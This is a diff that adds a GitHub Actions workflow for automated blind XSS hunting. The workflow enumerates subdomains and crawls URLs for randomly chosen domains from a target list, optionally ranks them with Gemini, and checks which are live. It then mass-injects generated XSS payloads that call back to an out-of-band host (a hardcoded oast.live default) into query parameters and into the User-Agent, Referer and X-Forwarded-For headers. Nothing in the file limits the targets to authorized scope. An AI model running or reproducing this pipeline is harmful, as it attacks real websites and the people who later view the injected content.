@@ -1,0 +1,157 @@
+name: "Blind XSS Hunter - Deep Discovery"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_count:
+        description: 'Number of targets'
+        required: false
+        default: '2'
+      use_ai_triage:
+        description: 'Use AI to prioritize'
+        required: false
+        default: true
+        type: boolean
+
+jobs:
+  bxss-scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAIL_CHECK: ${{ secrets.EMAIL_USERNAME }}
+      DISCORD_CHECK: ${{ secrets.DISCORD_WEBHOOK }}
+      GEMINI_CHECK: ${{ secrets.GEMINI_API_KEY }}
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        
+      - name: Setup Tools
+        run: |
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/tomnomnom/qsreplace@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          pip install --quiet uro google-generativeai
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+          mkdir -p tmp results reports
+
+      - name: Active & Passive URL Collection
+        shell: bash
+        env:
+          TARGET_COUNT: ${{ github.event.inputs.target_count || '2' }}
+        run: |
+          set -euo pipefail
+          touch tmp/subs.txt tmp/raw_urls.txt tmp/filtered.txt tmp/final_targets.txt
+          grep -v "^#" targets.txt | grep -v "^$" | shuf -n "$TARGET_COUNT" > tmp/active_targets.txt
+          
+          while IFS= read -r domain; do
+            domain=$(echo "$domain" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
+            echo "🎯 Target: $domain"
+            subfinder -d "$domain" -silent >> tmp/subs.txt || echo "$domain" >> tmp/subs.txt
+            
+            # Select top 3 subdomains + Apex to stay under time limit
+            (head -n 3 tmp/subs.txt; echo "$domain") | sort -u | while read -r sub; do
+               echo "  ∟ Passive Crawl: $sub"
+               (timeout 40s waybackurls "$sub" 2>/dev/null || true) >> tmp/raw_urls.txt
+               (timeout 40s gau "$sub" --threads 5 --blacklist jpg,png,gif,css --subs 2>/dev/null || true) >> tmp/raw_urls.txt
+               
+               echo "  ∟ Active Spidering: $sub"
+               (timeout 60s katana -u "$sub" -silent -nc -jc -kf all -d 2 || true) >> tmp/raw_urls.txt
+            done
+          done < tmp/active_targets.txt
+          
+          if [[ -s tmp/raw_urls.txt ]]; then
+            cat tmp/raw_urls.txt | uro | grep "=" > tmp/filtered.txt || true
+            if [[ ! -s tmp/filtered.txt ]]; then
+               echo "⚠️ Forcing hooks on unique paths..."
+               cat tmp/raw_urls.txt | sort -u | head -n 50 | sed 's/$/?q=bxss\&debug=1/' >> tmp/filtered.txt
+            fi
+          fi
+          echo "URL_FILTERED=$(wc -l < tmp/filtered.txt)" >> $GITHUB_ENV
+
+      - name: AI Triage
+        if: github.event.inputs.use_ai_triage == true && env.GEMINI_CHECK != ''
+        shell: bash
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+        run: |
+          if [[ -s tmp/filtered.txt ]]; then
+            python3 ai_triage.py tmp/filtered.txt tmp/ || true
+            touch tmp/high_priority.txt tmp/medium_priority.txt
+            cat tmp/high_priority.txt tmp/medium_priority.txt | head -n 100 > tmp/final_targets.txt || true
+          fi
+          [[ ! -s tmp/final_targets.txt && -s tmp/filtered.txt ]] && head -n 50 tmp/filtered.txt > tmp/final_targets.txt || true
+          echo "AI_TRIAGE_USED=true" >> $GITHUB_ENV
+
+      - name: Resilient Live Verification
+        run: |
+          if [[ -s tmp/final_targets.txt ]]; then
+            echo "🔍 Verifying URLs..."
+            cat tmp/final_targets.txt | httpx -silent -timeout 10 -threads 30 -follow-redirects -no-color > tmp/live_urls.txt || true
+            
+            if [[ -s tmp/live_urls.txt ]]; then
+              mv tmp/live_urls.txt tmp/final_targets.txt
+              echo "✅ Verification successful"
+            else
+              echo "⚠️ Fallback: Using unverified list to prevent empty run"
+            fi
+          fi
+          echo "URLS_SELECTED=$(wc -l < tmp/final_targets.txt)" >> $GITHUB_ENV
+
+      - name: Injection Phase (URL + Header)
+        shell: bash
+        env:
+          OAST_URL: ${{ secrets.OAST_URL || 'd51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live' }}
+        run: |
+          python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt
+          
+          if [[ ! -s tmp/final_targets.txt ]]; then
+            echo "❌ No targets. Exiting."
+            exit 0
+          fi
+
+          mapfile -t PAYLOADS < tmp/payloads.txt
+          success_count=0
+          
+          for i in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$i]}"
+            echo "💉 Injecting Variant $((i+1))"
+            
+            # Injecting into URL parameters AND User-Agent/X-Forwarded-For headers
+            count=$(cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 15 \
+              curl -sk -L -m 8 -w "%{http_code}\n" -o /dev/null \
+              -H "User-Agent: $payload" \
+              -H "Referer: $payload" \
+              -H "X-Forwarded-For: $payload" \
+              "{}" | grep -cE "^(200|302|403|404)" || echo 0)
+            
+            success_count=$((success_count + count))
+            sleep 1
+          done
+          
+          echo "INJECTIONS_SUCCESS=$success_count" >> $GITHUB_ENV
+          echo "PAYLOAD_COUNT=${#PAYLOADS[@]}" >> $GITHUB_ENV
+
+      - name: Generate Summary Report
+        if: always()
+        run: |
+          cat > reports/scan_summary.md << EOF
+          # 🎯 Blind XSS Scan Summary
+          | Metric | Value |
+          |--------|-------|
+          | Filtered URLs | $URL_FILTERED |
+          | Verified Live | $URLS_SELECTED |
+          | Total Injections | $INJECTIONS_SUCCESS |
+          
+          📡 **OAST Endpoint:** \`${{ secrets.OAST_URL || 'd51hku...oast.live' }}\`
+          EOF
+
+      - name: Discord Notification
+        if: always() && env.DISCORD_CHECK != ''
+        shell: bash
+        run: |
+          curl -X POST "${{ secrets.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" \
+          -d "{\"content\": \"🚀 **BXSS Scan Complete.** $INJECTIONS_SUCCESS injections on $URLS_SELECTED targets.\"}"
